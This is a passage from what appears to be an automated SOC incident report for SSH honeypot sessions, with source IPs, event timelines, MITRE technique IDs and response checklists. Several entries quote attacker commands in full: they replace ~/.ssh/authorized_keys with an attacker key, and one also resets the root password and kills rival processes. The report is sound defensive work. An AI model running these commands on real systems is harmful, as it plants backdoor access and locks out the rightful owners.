| `2026-04-25 11:33:30` | `cowrie.command.failed` |
| `2026-04-25 11:33:31` | `cowrie.log.closed` |
| `2026-04-25 11:33:31` | `cowrie.session.params` |
| `2026-04-25 11:33:31` | `cowrie.command.input` |
| `2026-04-25 11:33:31` | `cowrie.session.file_download` |
| `2026-04-25 11:33:31` | `cowrie.log.closed` |
| `2026-04-25 11:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0c4df4c15b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:33 |
| **Last Seen** | 2026-04-25 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:33:33` | `cowrie.session.connect` |
| `2026-04-25 11:33:33` | `cowrie.client.version` |
| `2026-04-25 11:33:33` | `cowrie.client.kex` |
| `2026-04-25 11:33:33` | `cowrie.login.success` |
| `2026-04-25 11:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73bbe90b4b74

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:14 |
| **Last Seen** | 2026-04-25 12:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:14:37` | `cowrie.session.connect` |
| `2026-04-25 12:14:37` | `cowrie.client.version` |
| `2026-04-25 12:14:37` | `cowrie.client.kex` |
| `2026-04-25 12:14:38` | `cowrie.login.success` |
| `2026-04-25 12:14:38` | `cowrie.session.params` |
| `2026-04-25 12:14:38` | `cowrie.command.input` |
| `2026-04-25 12:14:38` | `cowrie.command.failed` |
| `2026-04-25 12:14:39` | `cowrie.log.closed` |
| `2026-04-25 12:14:39` | `cowrie.session.params` |
| `2026-04-25 12:14:39` | `cowrie.command.input` |
| `2026-04-25 12:14:39` | `cowrie.session.file_download` |
| `2026-04-25 12:14:39` | `cowrie.log.closed` |
| `2026-04-25 12:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0471eed92ad7

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:14 |
| **Last Seen** | 2026-04-25 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:14:42` | `cowrie.session.connect` |
| `2026-04-25 12:14:42` | `cowrie.client.version` |
| `2026-04-25 12:14:42` | `cowrie.client.kex` |
| `2026-04-25 12:14:43` | `cowrie.login.success` |
| `2026-04-25 12:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5cf38e2628d

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:15 |
| **Last Seen** | 2026-04-25 12:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:15:37` | `cowrie.session.connect` |
| `2026-04-25 12:15:37` | `cowrie.client.version` |
| `2026-04-25 12:15:38` | `cowrie.client.kex` |
| `2026-04-25 12:15:38` | `cowrie.login.success` |
| `2026-04-25 12:15:39` | `cowrie.session.params` |
| `2026-04-25 12:15:39` | `cowrie.command.input` |
| `2026-04-25 12:15:39` | `cowrie.command.failed` |
| `2026-04-25 12:15:39` | `cowrie.log.closed` |
| `2026-04-25 12:15:40` | `cowrie.session.params` |
| `2026-04-25 12:15:40` | `cowrie.command.input` |
| `2026-04-25 12:15:40` | `cowrie.session.file_download` |
| `2026-04-25 12:15:40` | `cowrie.log.closed` |
| `2026-04-25 12:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe5f200b9ce

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:15 |
| **Last Seen** | 2026-04-25 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:15:43` | `cowrie.session.connect` |
| `2026-04-25 12:15:43` | `cowrie.client.version` |
| `2026-04-25 12:15:43` | `cowrie.client.kex` |
| `2026-04-25 12:15:44` | `cowrie.login.success` |
| `2026-04-25 12:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7aa374a941

| Field | Detail |
|---|---|
| **Source IP** | `123.59.7[.]18` |
| **First Seen** | 2026-04-25 12:17 |
| **Last Seen** | 2026-04-25 12:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:17:31` | `cowrie.session.connect` |
| `2026-04-25 12:17:31` | `cowrie.client.version` |
| `2026-04-25 12:17:31` | `cowrie.client.kex` |
| `2026-04-25 12:17:32` | `cowrie.login.success` |
| `2026-04-25 12:17:32` | `cowrie.session.params` |
| `2026-04-25 12:17:32` | `cowrie.command.input` |
| `2026-04-25 12:17:32` | `cowrie.command.failed` |
| `2026-04-25 12:17:32` | `cowrie.log.closed` |
| `2026-04-25 12:17:32` | `cowrie.session.params` |
| `2026-04-25 12:17:32` | `cowrie.command.input` |
| `2026-04-25 12:17:33` | `cowrie.session.file_download` |
| `2026-04-25 12:17:33` | `cowrie.log.closed` |
| `2026-04-25 12:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.59.7[.]18` to AbuseIPDB if not already reported
- [ ] Block `123.59.7[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4af8c9c6c9

| Field | Detail |
|---|---|
| **Source IP** | `123.59.7[.]18` |
| **First Seen** | 2026-04-25 12:17 |
| **Last Seen** | 2026-04-25 12:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:17:35` | `cowrie.session.connect` |
| `2026-04-25 12:17:35` | `cowrie.client.version` |
| `2026-04-25 12:17:35` | `cowrie.client.kex` |
| `2026-04-25 12:17:35` | `cowrie.login.success` |
| `2026-04-25 12:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.59.7[.]18` to AbuseIPDB if not already reported
- [ ] Block `123.59.7[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e328c728e71a

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:21 |
| **Last Seen** | 2026-04-25 12:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:21:39` | `cowrie.session.connect` |
| `2026-04-25 12:21:39` | `cowrie.client.version` |
| `2026-04-25 12:21:39` | `cowrie.client.kex` |
| `2026-04-25 12:21:40` | `cowrie.login.success` |
| `2026-04-25 12:21:40` | `cowrie.session.params` |
| `2026-04-25 12:21:40` | `cowrie.command.input` |
| `2026-04-25 12:21:40` | `cowrie.command.failed` |
| `2026-04-25 12:21:40` | `cowrie.log.closed` |
| `2026-04-25 12:21:41` | `cowrie.session.params` |
| `2026-04-25 12:21:41` | `cowrie.command.input` |
| `2026-04-25 12:21:41` | `cowrie.session.file_download` |
| `2026-04-25 12:21:41` | `cowrie.log.closed` |
| `2026-04-25 12:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3190f0b7dd2e

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:21 |
| **Last Seen** | 2026-04-25 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:21:44` | `cowrie.session.connect` |
| `2026-04-25 12:21:44` | `cowrie.client.version` |
| `2026-04-25 12:21:44` | `cowrie.client.kex` |
| `2026-04-25 12:21:45` | `cowrie.login.success` |
| `2026-04-25 12:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099c1576eede

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]35` |
| **First Seen** | 2026-04-25 12:23 |
| **Last Seen** | 2026-04-25 12:23 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:PWAmrFYZYr2P"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:23:35` | `cowrie.session.connect` |
| `2026-04-25 12:23:35` | `cowrie.client.version` |
| `2026-04-25 12:23:35` | `cowrie.client.kex` |
| `2026-04-25 12:23:38` | `cowrie.login.success` |
| `2026-04-25 12:23:38` | `cowrie.session.params` |
| `2026-04-25 12:23:38` | `cowrie.command.input` |
| `2026-04-25 12:23:38` | `cowrie.command.failed` |
| `2026-04-25 12:23:38` | `cowrie.log.closed` |
| `2026-04-25 12:23:38` | `cowrie.session.params` |
| `2026-04-25 12:23:38` | `cowrie.command.input` |
| `2026-04-25 12:23:42` | `cowrie.session.file_download` |
| `2026-04-25 12:23:42` | `cowrie.log.closed` |
| `2026-04-25 12:23:51` | `cowrie.session.params` |
| `2026-04-25 12:23:51` | `cowrie.command.input` |
| `2026-04-25 12:23:51` | `cowrie.log.closed` |
| `2026-04-25 12:23:51` | `cowrie.session.params` |
| `2026-04-25 12:23:51` | `cowrie.command.input` |
| `2026-04-25 12:23:52` | `cowrie.log.closed` |
| `2026-04-25 12:23:52` | `cowrie.session.params` |
| `2026-04-25 12:23:52` | `cowrie.command.input` |
| `2026-04-25 12:23:52` | `cowrie.session.file_download` |
| `2026-04-25 12:23:52` | `cowrie.log.closed` |
| `2026-04-25 12:23:53` | `cowrie.session.params` |
| `2026-04-25 12:23:53` | `cowrie.command.input` |
| `2026-04-25 12:23:53` | `cowrie.log.closed` |
| `2026-04-25 12:23:53` | `cowrie.session.params` |
| `2026-04-25 12:23:53` | `cowrie.command.input` |
| `2026-04-25 12:23:53` | `cowrie.log.closed` |
| `2026-04-25 12:23:54` | `cowrie.session.params` |
| `2026-04-25 12:23:54` | `cowrie.command.input` |
| `2026-04-25 12:23:54` | `cowrie.command.input` |
| `2026-04-25 12:23:54` | `cowrie.log.closed` |
| `2026-04-25 12:23:54` | `cowrie.session.params` |
| `2026-04-25 12:23:54` | `cowrie.command.input` |
| `2026-04-25 12:23:54` | `cowrie.log.closed` |
| `2026-04-25 12:23:55` | `cowrie.session.params` |
| `2026-04-25 12:23:55` | `cowrie.command.input` |
| `2026-04-25 12:23:55` | `cowrie.log.closed` |
| `2026-04-25 12:23:55` | `cowrie.session.params` |
| `2026-04-25 12:23:55` | `cowrie.command.input` |
| `2026-04-25 12:23:55` | `cowrie.log.closed` |
| `2026-04-25 12:23:56` | `cowrie.session.params` |
| `2026-04-25 12:23:56` | `cowrie.command.input` |
| `2026-04-25 12:23:56` | `cowrie.log.closed` |
| `2026-04-25 12:23:56` | `cowrie.session.params` |
| `2026-04-25 12:23:56` | `cowrie.command.input` |
| `2026-04-25 12:23:57` | `cowrie.log.closed` |
| `2026-04-25 12:23:57` | `cowrie.session.params` |
| `2026-04-25 12:23:57` | `cowrie.command.input` |
| `2026-04-25 12:23:57` | `cowrie.log.closed` |
| `2026-04-25 12:23:57` | `cowrie.session.params` |
| `2026-04-25 12:23:57` | `cowrie.command.input` |
| `2026-04-25 12:23:58` | `cowrie.log.closed` |
| `2026-04-25 12:23:58` | `cowrie.session.params` |
| `2026-04-25 12:23:58` | `cowrie.command.input` |
| `2026-04-25 12:23:58` | `cowrie.log.closed` |
| `2026-04-25 12:23:58` | `cowrie.session.params` |
| `2026-04-25 12:23:58` | `cowrie.command.input` |
| `2026-04-25 12:23:59` | `cowrie.log.closed` |
| `2026-04-25 12:23:59` | `cowrie.session.params` |
| `2026-04-25 12:23:59` | `cowrie.command.input` |
| `2026-04-25 12:23:59` | `cowrie.log.closed` |
| `2026-04-25 12:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3e147c72f35

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:25 |
| **Last Seen** | 2026-04-25 12:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:25:55` | `cowrie.session.connect` |
| `2026-04-25 12:25:55` | `cowrie.client.version` |
| `2026-04-25 12:25:56` | `cowrie.client.kex` |
| `2026-04-25 12:25:56` | `cowrie.login.success` |
| `2026-04-25 12:25:57` | `cowrie.session.params` |
| `2026-04-25 12:25:57` | `cowrie.command.input` |
| `2026-04-25 12:25:57` | `cowrie.command.failed` |
| `2026-04-25 12:25:57` | `cowrie.log.closed` |
| `2026-04-25 12:25:58` | `cowrie.session.params` |
| `2026-04-25 12:25:58` | `cowrie.command.input` |
| `2026-04-25 12:25:58` | `cowrie.session.file_download` |
| `2026-04-25 12:25:58` | `cowrie.log.closed` |
| `2026-04-25 12:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d6d4109962

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:26 |
| **Last Seen** | 2026-04-25 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:26:00` | `cowrie.session.connect` |
| `2026-04-25 12:26:00` | `cowrie.client.version` |
| `2026-04-25 12:26:01` | `cowrie.client.kex` |
| `2026-04-25 12:26:01` | `cowrie.login.success` |
| `2026-04-25 12:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6d7773553e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:27 |
| **Last Seen** | 2026-04-25 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:27:36` | `cowrie.session.connect` |
| `2026-04-25 12:27:36` | `cowrie.client.version` |
| `2026-04-25 12:27:37` | `cowrie.client.kex` |
| `2026-04-25 12:27:38` | `cowrie.login.success` |
| `2026-04-25 12:27:39` | `cowrie.session.params` |
| `2026-04-25 12:27:39` | `cowrie.command.input` |
| `2026-04-25 12:27:39` | `cowrie.command.failed` |
| `2026-04-25 12:27:39` | `cowrie.log.closed` |
| `2026-04-25 12:27:40` | `cowrie.session.params` |
| `2026-04-25 12:27:40` | `cowrie.command.input` |
| `2026-04-25 12:27:40` | `cowrie.session.file_download` |
| `2026-04-25 12:27:40` | `cowrie.log.closed` |
| `2026-04-25 12:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df17e9e483c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:27 |
| **Last Seen** | 2026-04-25 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:27:43` | `cowrie.session.connect` |
| `2026-04-25 12:27:43` | `cowrie.client.version` |
| `2026-04-25 12:27:44` | `cowrie.client.kex` |
| `2026-04-25 12:27:45` | `cowrie.login.success` |
| `2026-04-25 12:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cae6ae7b03

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:28 |
| **Last Seen** | 2026-04-25 12:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
